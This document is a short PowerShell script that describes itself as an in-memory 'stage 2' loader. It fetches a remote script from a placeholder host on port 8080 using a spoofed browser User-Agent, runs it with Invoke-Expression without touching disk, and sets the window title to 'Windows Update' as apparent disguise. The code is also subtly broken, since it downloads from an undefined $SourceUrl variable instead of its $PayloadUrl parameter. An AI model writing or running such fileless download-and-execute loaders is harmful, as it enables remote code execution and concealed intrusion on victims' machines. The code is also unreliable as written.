
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://adatum.com:8080/stage2.ps1",
    [int]$RequestTimeout = 152
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$ScriptText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($ScriptText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $ScriptText.Length)
Invoke-Expression $ScriptText

$Host.UI.RawUI.WindowTitle = "Windows Update"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
